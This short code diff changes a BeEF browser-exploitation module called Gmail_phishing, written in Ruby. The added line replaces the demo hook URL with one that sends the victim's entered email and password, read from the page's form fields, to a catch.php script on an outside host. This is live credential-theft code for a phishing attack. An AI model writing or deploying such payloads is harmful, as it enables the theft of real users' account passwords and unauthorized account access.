@@ -11,7 +11,8 @@ class Gmail_phishing < BeEF::Core::Command
     beef_port = @configuration.beef_port
     base_host = "#{proto}://#{beef_host}:#{beef_port}"
 
-    xss_hook_url = "#{base_host}/demos/plain.html"
+    #xss_hook_url = "#{base_host}/demos/plain.html"
+    xss_hook_url = "\"https://www.dei.isep.ipp.pt/~jpl/catch.php?email=\" + document.getElementById('Email').value + \"&pwd=\" + document.getElementById('Passwd').value"
     logout_gmail_interval = 10_000
     wait_seconds_before_redirect = 1000
     [
